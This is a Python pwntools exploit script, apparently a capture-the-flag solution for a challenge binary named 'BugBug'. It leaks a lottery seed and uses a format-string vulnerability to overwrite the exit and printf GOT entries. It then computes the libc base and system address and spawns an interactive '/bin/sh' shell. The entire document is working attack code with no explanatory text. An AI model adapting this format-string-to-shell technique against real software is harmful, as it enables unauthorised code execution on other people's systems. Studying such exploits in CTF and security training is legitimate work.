from pwn import *
from subprocess import Popen, PIPE

conn = process("./BugBug")

def get_lottonum(seed):
    command = "./rand "+str(seed)
    popen = Popen(command, shell=True, stdout=PIPE)
    output, error = popen.communicate()    
    return output

exit_got = 0x804A024
printf_got = 0x804A010
main_addr = 0x804882E

# exit_got -> main_addr
payload = "%"+str(main_addr&0xFFFF)+"x"
payload += "%21$hn"
payload += "A"*(16-len(payload))
payload += p32(exit_got)
payload += "BASE%4$x"
payload += "B"*(100-len(payload))

conn.recvuntil("Who are you?")	
conn.sendline(payload)
conn.recvuntil("Hello~ ")
conn.recv(100)
## leak Lotto SEED
seed = u32(conn.recv(4))
lotto_num = get_lottonum(seed)

## leak and FSB
log.info(lotto_num)
conn.recvuntil("==> ")
conn.sendline(lotto_num)

## leak BASE_addr
conn.recvuntil("BASE")
base_addr = int(conn.recvuntil("BB")[:-2], 16) - 0x1fda74
log.info("base_addr : 0x%x" % base_addr)

system_addr = base_addr + 0x3ada0
system_first = (system_addr&0xFFFF)
system_next = (system_addr>>16) - (system_addr&0xFFFF)

log.info("distance : %d" % (system_next))

payload = "%"+str(system_first)+"x"
payload += "%26$hn"
payload += "%"+str(system_next)+"x"
payload += "%27$hn"
payload += "A"*(32-len(payload))
payload += p32(printf_got)
payload += p32(printf_got+2)
payload += "B"*(100-len(payload))

conn.sendline(payload)
conn.sendline(lotto_num)
conn.sendline("/bin/sh;")
conn.recvuntil("Input your answer@_@")
conn.sendline(lotto_num)

conn.interactive()